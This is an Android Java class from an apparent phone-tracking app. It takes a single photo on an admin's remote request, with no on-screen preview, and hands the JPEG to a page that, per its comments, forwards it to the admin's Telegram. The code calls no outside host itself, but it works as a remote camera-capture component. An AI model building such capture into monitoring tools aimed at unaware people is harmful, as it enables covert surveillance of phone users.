package com.smbbotlacak.tracker;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;

import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Pengambilan satu foto sesuai permintaan admin.
 *
 * Kelas ini sengaja TIDAK mengirim apa pun ke server/Telegram sendiri: hasil JPEG
 * dikembalikan ke JavaScript, lalu TrackerPage mengirimkannya ke broker (yang
 * meneruskannya ke Telegram admin). Tidak ada token bot yang disimpan di HP dan
 * tidak ada penjadwalan pengambilan foto.
 */
public class CameraCapture {

    private static final String TAG = "SMBCameraCapture";
    private static final int CAPTURE_WIDTH = 1280;
    private static final int CAPTURE_HEIGHT = 720;

    private static final ExecutorService captureExecutor = Executors.newSingleThreadExecutor();

    public interface CaptureCallback {
        void onSuccess(byte[] jpeg);

        void onError(String message);
    }

    /** Ambil satu foto kamera (lensFacing = CameraCharacteristics.LENS_FACING_*). */
    public static void capture(Context context, int lensFacing, CaptureCallback callback) {
        captureExecutor.execute(() -> {
            HandlerThread cameraThread = new HandlerThread("SMBCaptureThread");
            cameraThread.start();
            Handler cameraHandler = new Handler(cameraThread.getLooper());

            Semaphore captureLock = new Semaphore(0);
            AtomicReference<byte[]> jpegResult = new AtomicReference<>(null);
            AtomicReference<String> errorMessage = new AtomicReference<>(null);
            AtomicReference<CameraDevice> cameraDeviceRef = new AtomicReference<>(null);
            AtomicReference<ImageReader> imageReaderRef = new AtomicReference<>(null);

            try {
                CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                String cameraId = findCamera(manager, lensFacing);
                if (cameraId == null) {
                    cameraThread.quitSafely();
                    if (callback != null) callback.onError("Kamera tidak ditemukan di HP ini");
                    return;
                }

                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Size[] outputSizes = characteristics
                        .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        .getOutputSizes(ImageFormat.JPEG);
                Size captureSize = chooseBestSize(outputSizes);

                ImageReader imageReader = ImageReader.newInstance(
                        captureSize.getWidth(), captureSize.getHeight(),
                        ImageFormat.JPEG, 2
                );
                imageReaderRef.set(imageReader);

                imageReader.setOnImageAvailableListener(reader -> {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            jpegResult.set(bytes);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error reading image buffer", e);
                    } finally {
                        captureLock.release();
                    }
                }, cameraHandler);

                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDeviceRef.set(camera);
                        try {
                            Surface readerSurface = imageReader.getSurface();
                            camera.createCaptureSession(
                                    Collections.singletonList(readerSurface),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(@NonNull CameraCaptureSession session) {
                                            try {
                                                CaptureRequest.Builder builder =
                                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                builder.addTarget(readerSurface);
                                                builder.set(CaptureRequest.CONTROL_AF_MODE,
                                                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                                builder.set(CaptureRequest.CONTROL_AE_MODE,
                                                        CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                                                session.capture(builder.build(), null, cameraHandler);
                                            } catch (CameraAccessException e) {
                                                Log.e(TAG, "Error creating capture request", e);
                                                errorMessage.set("Permintaan jepretan gagal: " + e.getMessage());
                                                captureLock.release();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                            Log.e(TAG, "Camera session configuration failed");
                                            errorMessage.set("Sesi kamera gagal disiapkan");
                                            captureLock.release();
                                        }
                                    },
                                    cameraHandler
                            );
                        } catch (Exception e) {
                            Log.e(TAG, "Error in onOpened", e);
                            errorMessage.set("Kamera gagal dibuka: " + e.getMessage());
                            captureLock.release();
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        camera.close();
                        errorMessage.set("Kamera terputus");
                        captureLock.release();
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        camera.close();
                        errorMessage.set("Galat kamera kode " + error);
                        captureLock.release();
                    }
                }, cameraHandler);

                boolean acquired = captureLock.tryAcquire(10, TimeUnit.SECONDS);

                if (cameraDeviceRef.get() != null) {
                    try { cameraDeviceRef.get().close(); } catch (Exception ignored) { }
                }
                if (imageReaderRef.get() != null) {
                    try { imageReaderRef.get().close(); } catch (Exception ignored) { }
                }
                cameraThread.quitSafely();

                byte[] jpeg = jpegResult.get();
                if (jpeg != null && jpeg.length > 0) {
                    if (callback != null) callback.onSuccess(jpeg);
                } else {
                    String err = errorMessage.get() != null ? errorMessage.get()
                            : (acquired ? "Hasil kamera kosong" : "Kamera tidak merespons (timeout)");
                    if (callback != null) callback.onError(err);
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Camera permission missing", e);
                cameraThread.quitSafely();
                if (callback != null) callback.onError("Izin kamera Android belum diberikan");
            } catch (Exception e) {
                Log.e(TAG, "General capture exception", e);
                cameraThread.quitSafely();
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }

    private static String findCamera(CameraManager manager, int lensFacing) {
        try {
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == lensFacing) return id;
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "findCamera error", e);
        }
        return null;
    }

    private static Size chooseBestSize(Size[] sizes) {
        if (sizes == null || sizes.length == 0) return new Size(CAPTURE_WIDTH, CAPTURE_HEIGHT);
        Size best = sizes[0];
        long targetPixels = (long) CAPTURE_WIDTH * CAPTURE_HEIGHT;
        long bestDiff = Long.MAX_VALUE;
        for (Size s : sizes) {
            long diff = Math.abs((long) s.getWidth() * s.getHeight() - targetPixels);
            if (diff < bestDiff) { bestDiff = diff; best = s; }
        }
        return best;
    }
}
